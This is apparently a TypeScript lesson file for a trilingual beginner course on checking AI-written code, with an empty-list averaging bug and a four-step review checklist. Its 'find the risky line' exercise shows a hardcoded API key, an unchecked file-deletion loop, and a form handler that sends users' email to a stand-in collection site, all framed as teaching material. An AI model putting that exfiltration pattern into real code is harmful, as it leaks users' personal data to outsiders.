import { kit } from '@engine/kit';

const CSS = `.wrap{display:grid;place-items:center;height:100%;font-family:Manrope,system-ui}
.tests{width:460px;display:grid;gap:10px}
.t{display:grid;grid-template-columns:1fr 80px 50px;align-items:center;padding:12px 16px;border-radius:14px;background:#fff;box-shadow:0 4px 14px #0001;font:700 19px JetBrains Mono,monospace}
.t i{font-style:normal;color:#6b7183}.t b{font-size:24px;text-align:right}
.t.ok{background:#e8faf7}.t.bad{background:#fff1f1;color:#c62828}.t.wait{opacity:.4}`;
const T: [string, string][] = [['average([2, 4])', '3'], ['average([10])', '10'], ['average([])', '?']];
const tests = (st: ('ok' | 'bad' | 'wait')[], last = 'NaN') =>
  `<div class="wrap"><div class="tests">${T.map(([c, r], i) => `<div class="t ${st[i]}"><span>${c}</span><i>${i === 2 ? (st[i] === 'wait' ? '?' : last) : r}</i><b>${st[i] === 'ok' ? '✅' : st[i] === 'bad' ? '❌' : '⏳'}</b></div>`).join('')}</div></div>`;

export default kit({
  id: 'tilda-git-g07',
  title: "AI написал код: можно ли ему доверять? ¦ AI kod yozdi: unga ishonish mumkinmi? ¦ AI wrote the code: can you trust it?",
  question: "Как проверить код от AI, прежде чем поставить его в свой проект? ¦ AI kodini loyihangizga qo'yishdan oldin qanday tekshirish mumkin? ¦ How do you check AI's code before putting it in your project?",
  route: ["Выглядит нормально ¦ Normal ko'rinadi ¦ Looks fine", "Тесты ¦ Testlar ¦ Tests", "Опасное ¦ Xavfli ¦ Danger signs", "Проверка ¦ Tekshiruv ¦ Check", "Финал ¦ Yakun ¦ Finale"],
  scenes: [
    {
      type: 'intro',
      stage: 0,
      icon: '🕵️',
      kicker: "Tilda · Git · общая тема 7 ¦ Tilda · Git · umumiy mavzu 7 ¦ Tilda · Git · general topic 7",
      title: "Красивый код ≠ правильный код ¦ Chiroyli kod ≠ to'g'ri kod ¦ Pretty code ≠ correct code",
      chat: "вы проверяете код от AI перед тем, как вставить? ¦ AI kodini qo'yishdan oldin tekshirasizmi? ¦ do you check AI's code before pasting it?",
      lead: "AI пишет код, который выглядит уверенно. Но в нём могут прятаться ошибки и даже опасные вещи. Есть простой чек-лист из 4 шагов. ¦ AI ishonchli ko'rinadigan kod yozadi. Lekin unda xatolar va hatto xavfli narsalar yashiringan bo'lishi mumkin. 4 qadamli oddiy tekshiruv ro'yxati bor. ¦ AI writes confident-looking code, but bugs and even dangerous things can hide in it. There's a simple 4-step checklist.",
      facts: ["1. Понимаю каждую строку ¦ 1. Har bir qatorni tushunaman ¦ 1. I understand every line", "2–3. Запускаю и тестирую ¦ 2–3. Ishga tushiraman va sinayman ¦ 2–3. Run and test it", "4. Ищу опасное ¦ 4. Xavfli narsani qidiraman ¦ 4. Look for danger signs"],
      takeaway: "Проверим функцию, которую написал AI. ¦ AI yozgan funksiyani tekshiramiz. ¦ Let's test a function AI wrote.",
      notes: { min: 3 },
    },
    {
      type: 'show',
      stage: 1,
      title: "Тесты ловят скрытую ошибку ¦ Testlar yashirin xatoni ushlaydi ¦ Tests catch a hidden bug",
      chat: "что вернёт average([])? ¦ average([]) nima qaytaradi? ¦ what will average([]) return?",
      lang: 'js',
      css: CSS,
      steps: [
        { code: "function average(nums) {\n  let sum = 0;\n  for (const n of nums) sum += n;\n  return sum / nums.length;\n}", line: 4, html: tests(['wait', 'wait', 'wait']), say: "AI написал «среднее значение». Выглядит правильно! ¦ AI «o'rtacha qiymat»ni yozdi. To'g'ri ko'rinadi! ¦ AI wrote an “average” function. Looks right!" },
        { code: 'average([2, 4]);  // 3\naverage([10]);    // 10', line: 1, html: tests(['ok', 'ok', 'wait']), say: "Обычные случаи — работают. ¦ Oddiy holatlar — ishlaydi. ¦ Normal cases work." },
        { code: 'average([]);  // NaN 😱', line: 1, html: tests(['ok', 'ok', 'bad']), say: "А пустой список? 0 / 0 — получилось NaN, «не число». Баг! ¦ Bo'sh ro'yxat-chi? 0 / 0 — NaN, «son emas» chiqdi. Xato! ¦ And an empty list? 0 / 0 gives NaN, “not a number”. A bug!" },
        { code: "function average(nums) {\n  if (nums.length === 0) return 0;\n  let sum = 0;\n  for (const n of nums) sum += n;\n  return sum / nums.length;\n}", line: 2, html: tests(['ok', 'ok', 'ok'], '0'), say: "Добавили одну проверку — все тесты зелёные. ¦ Bitta tekshiruv qo'shdik — barcha testlar yashil. ¦ One check added and every test is green." },
      ],
      takeaway: "Проверяйте не только обычный случай, но и «странный»: пусто, ноль, очень много. ¦ Faqat oddiy holatni emas, «g'alati»sini ham tekshiring: bo'sh, nol, juda ko'p. ¦ Test the odd cases too: empty, zero, very large.",
      notes: { min: 6 },
    },
    {
      type: 'animate',
      stage: 1,
      title: "Чек-лист доверия ¦ Ishonch tekshiruv ro'yxati ¦ The trust checklist",
      chat: "какой шаг чаще всего пропускают? ¦ qaysi qadam ko'pincha o'tkazib yuboriladi? ¦ which step gets skipped most?",
      actors: [
        { id: 'code', icon: '🤖', label: "Код от AI ¦ AI kodi ¦ AI's code" },
        { id: 's1', icon: '📖', label: "1. Понимаю ¦ 1. Tushunaman ¦ 1. Understand" },
        { id: 's2', icon: '▶️', label: "2. Запускаю ¦ 2. Ishga tushiraman ¦ 2. Run" },
        { id: 's3', icon: '🧪', label: "3. Тесты ¦ 3. Testlar ¦ 3. Test" },
        { id: 's4', icon: '🛡️', label: "4. Нет опасного ¦ 4. Xavfli yo'q ¦ 4. Nothing risky" },
        { id: 'ok', icon: '✅', label: "Можно в проект ¦ Loyihaga mumkin ¦ OK for the project" },
      ],
      steps: [
        { say: "AI прислал код. ¦ AI kod yubordi. ¦ AI sends some code.", at: { code: [8, 50, 1.2] } },
        { say: "1. Читаем: понятна ли каждая строка? Нет — просим объяснить. ¦ 1. O'qiymiz: har bir qator tushunarlimi? Yo'q — tushuntirishni so'raymiz. ¦ 1. Read: is every line clear? If not, ask for an explanation.", at: { s1: [26, 26] }, lines: [['code', 's1']] },
        { say: "2. Запускаем: работает ли вообще? ¦ 2. Ishga tushiramiz: umuman ishlaydimi? ¦ 2. Run: does it work at all?", at: { s2: [44, 74] }, lines: [['code', 's1'], ['s1', 's2']] },
        { say: "3. Тесты: обычные и «странные» случаи. ¦ 3. Testlar: oddiy va «g'alati» holatlar. ¦ 3. Tests: normal and odd cases.", at: { s3: [62, 26] }, lines: [['code', 's1'], ['s1', 's2'], ['s2', 's3']] },
        { say: "4. Опасное: пароли в коде, странные ссылки, удаление файлов. ¦ 4. Xavfli: koddagi parollar, g'alati havolalar, fayllarni o'chirish. ¦ 4. Danger: passwords in code, odd links, deleting files.", at: { s4: [78, 74] }, lines: [['code', 's1'], ['s1', 's2'], ['s2', 's3'], ['s3', 's4']] },
        { say: "Все 4 пройдены — код можно ставить в проект. ¦ Barcha 4 tasi o'tdi — kodni loyihaga qo'yish mumkin. ¦ All 4 passed — the code can go into the project.", at: { ok: [93, 26, 1.2] }, lines: [['code', 's1'], ['s1', 's2'], ['s2', 's3'], ['s3', 's4'], ['s4', 'ok']], pulse: ['ok'] },
      ],
      takeaway: "Понимаю → запускаю → тестирую → ищу опасное. ¦ Tushunaman → ishga tushiraman → sinayman → xavflini qidiraman. ¦ Understand → run → test → look for danger.",
      notes: { min: 4 },
    },
    {
      type: 'bugs',
      stage: 2,
      title: "Найдите опасную строку ¦ Xavfli qatorni toping ¦ Find the risky line",
      chat: "пишите номер строки ¦ qator raqamini yozing ¦ write the line number",
      snippets: [
        { title: "Секрет прямо в коде ¦ Sir to'g'ridan-to'g'ri kodda ¦ A secret right in the code", code: "const city = 'Tashkent';\nconst apiKey = 'sk-live-…';\nloadWeather(city, apiKey);", lang: 'js', line: 2, explain: "Ключи и пароли нельзя хранить в коде, который увидят другие. ¦ Kalitlar va parollarni boshqalar ko'radigan kodda saqlab bo'lmaydi. ¦ Keys and passwords must not live in code others can see.", fix: "// keep keys in a private settings file" },
        { title: "Отправка данных незнакомцу ¦ Ma'lumotlarni notanishga yuborish ¦ Sending data to a stranger", code: "form.onsubmit = () => {\n  fetch('https://free-prizes.example/collect', { body: form.email.value });\n};", lang: 'js', line: 2, explain: "Код шлёт данные формы на чужой сайт. Такое не ставим. ¦ Kod forma ma'lumotlarini begona saytga yuboradi. Buni qo'ymaymiz. ¦ It sends form data to someone else's site. Never ship that.", fix: "// send only to your own, known server" },
        { title: "Удаляет всё подряд ¦ Hammasini o'chiradi ¦ Deletes everything", code: "for (const file of files) {\n  deleteFile(file);\n}", lang: 'js', line: 2, explain: "Удаление без проверки и копии — риск потерять всё. ¦ Tekshiruvsiz va nusxasiz o'chirish — hammasini yo'qotish xavfi. ¦ Deleting with no check or backup risks losing everything.", fix: "// ask first, keep a backup" },
      ],
      notes: { min: 5 },
    },
    {
      type: 'sort',
      stage: 3,
      title: "Тревожный знак или нормально? ¦ Xavotirli belgimi yoki normalmi? ¦ Red flag or fine?",
      chat: "пишите: «1 — тревога» ¦ yozing: «1 — xavotir» ¦ write: “1 — red flag”",
      zones: [
        { id: 'ok', label: "Нормально ¦ Normal ¦ Fine", icon: '🟢' },
        { id: 'red', label: "Тревожный знак ¦ Xavotirli belgi ¦ Red flag", icon: '🚩' },
      ],
      items: [
        { text: "Понятные имена переменных ¦ Tushunarli o'zgaruvchi nomlari ¦ Clear variable names", zone: 'ok' },
        { text: "Пароль записан в коде ¦ Parol kodda yozilgan ¦ A password written in the code", zone: 'red' },
        { text: "Отправка данных на неизвестный сайт ¦ Ma'lumotlarni noma'lum saytga yuborish ¦ Data sent to an unknown site", zone: 'red' },
        { text: "Есть проверка на пустой список ¦ Bo'sh ro'yxat uchun tekshiruv bor ¦ A check for an empty list", zone: 'ok' },
        { text: "Строка, которую никто не понимает ¦ Hech kim tushunmaydigan qator ¦ A line nobody understands", zone: 'red' },
      ],
      notes: { min: 3 },
    },
    {
      type: 'truefalse',
      stage: 3,
      title: "Правда или миф? ¦ Rostmi yoki afsona? ¦ True or myth?",
      chat: "пишите «правда» или «миф» ¦ «rost» yoki «afsona» deb yozing ¦ write “true” or “myth”",
      statements: [
        { text: "Если код запустился, он правильный ¦ Kod ishga tushsa, u to'g'ri ¦ If code runs, it's correct", truth: false, explain: "Ошибка может прятаться в «странном» случае. ¦ Xato «g'alati» holatda yashiringan bo'lishi mumkin. ¦ A bug may hide in an odd case." },
        { text: "Код, который не понимаешь, лучше не ставить ¦ Tushunmagan kodni qo'ymagan ma'qul ¦ Don't ship code you don't understand", truth: true, explain: "Сначала попросите объяснение. ¦ Avval tushuntirishni so'rang. ¦ Ask for an explanation first." },
        { text: "Тесты — это трата времени ¦ Testlar — vaqtni behuda sarflash ¦ Tests waste time", truth: false, explain: "Они ловят баги раньше пользователей. ¦ Ular xatolarni foydalanuvchilardan oldin ushlaydi. ¦ They catch bugs before users do." },
      ],
      notes: { min: 3 },
    },
    {
      type: 'mission',
      stage: 4,
      title: "Миссия: инспектор кода ¦ Missiya: kod inspektori ¦ Mission: code inspector",
      chat: "номера ответов в чат ¦ javob raqamlarini chatga ¦ answer numbers in the chat",
      goal: "В проект попал только надёжный код! ¦ Loyihaga faqat ishonchli kod tushdi! ¦ Only trustworthy code got in!",
      items: [
        { title: "Какой тест забыл AI? ¦ AI qaysi testni unutdi? ¦ Which test did AI forget?", choices: ["Пустой список ¦ Bo'sh ro'yxat ¦ An empty list", "Список из двух чисел ¦ Ikki sonli ro'yxat ¦ A two-number list"], correct: 0, explain: "Странные случаи ломают код. ¦ G'alati holatlar kodni buzadi. ¦ Odd cases break code." },
        { title: "В коде есть пароль ¦ Kodda parol bor ¦ The code contains a password", choices: ["Убрать и спрятать в настройки ¦ Olib tashlab, sozlamalarga yashirish ¦ Remove it, keep it in private settings", "Оставить ¦ Qoldirish ¦ Leave it"], correct: 0, explain: "Секреты не живут в коде. ¦ Sirlar kodda yashamaydi. ¦ Secrets don't live in code." },
        { title: "Не понимаю строку ¦ Qatorni tushunmayapman ¦ I don't understand a line", choices: ["Попросить AI объяснить ¦ AI'dan tushuntirishni so'rash ¦ Ask AI to explain", "Вставить как есть ¦ Shundayligicha qo'yish ¦ Paste it as is"], correct: 0, explain: "Шаг 1 чек-листа. ¦ Ro'yxatning 1-qadami. ¦ Checklist step 1." },
      ],
      notes: { min: 3 },
    },
    {
      type: 'finale',
      stage: 4,
      title: "Итог: доверять ли коду от AI ¦ Xulosa: AI kodiga ishonish kerakmi ¦ Summary: trusting AI's code",
      chat: "какой шаг чек-листа добавите в свою привычку? ¦ ro'yxatning qaysi qadamini odatingizga qo'shasiz? ¦ which checklist step will become your habit?",
      answer: "Код от AI может выглядеть правильно и всё равно ломаться. Проверяем по чек-листу: понимаю каждую строку → запускаю → тестирую обычные и «странные» случаи (пусто, ноль) → ищу опасное: пароли в коде, отправку данных на чужие сайты, удаление файлов. Только после всех четырёх шагов код идёт в проект. ¦ AI kodi to'g'ri ko'rinishi va baribir buzilishi mumkin. Ro'yxat bo'yicha tekshiramiz: har bir qatorni tushunaman → ishga tushiraman → oddiy va «g'alati» holatlarni (bo'sh, nol) sinayman → xavfli narsalarni qidiraman: koddagi parollar, ma'lumotlarni begona saytlarga yuborish, fayllarni o'chirish. Faqat to'rtta qadamdan keyin kod loyihaga tushadi. ¦ AI's code can look right and still break. Check it with the list: understand every line → run it → test normal and odd cases (empty, zero) → look for danger: passwords in code, data sent to strange sites, file deletion. Only after all four does the code go into the project.",
      icon: '🕵️',
      badge: "Инспектор кода ¦ Kod inspektori ¦ Code inspector",
      badgeSub: "Tilda · Git · общая 7 ¦ Tilda · Git · umumiy 7 ¦ Tilda · Git · general 7",
      homeworkTitle: "Дома ¦ Uyda ¦ At home",
      homework: [
        "Попросите AI написать функцию и придумайте к ней 3 теста, включая «странный». ¦ AI'dan funksiya yozishni so'rang va unga 3 ta test, jumladan «g'alati»sini o'ylab toping. ¦ Ask AI for a function and write 3 tests for it, including an odd case.",
        "Проверьте её по чек-листу из 4 шагов. ¦ Uni 4 qadamli ro'yxat bo'yicha tekshiring. ¦ Check it with the 4-step list.",
      ],
      takeaway: "Модуль Tilda и Git пройден! Дальше — JavaScript. ¦ Tilda va Git moduli tugadi! Keyingisi — JavaScript. ¦ Tilda and Git module complete! Next: JavaScript.",
      notes: { min: 2 },
    },
  ],
});
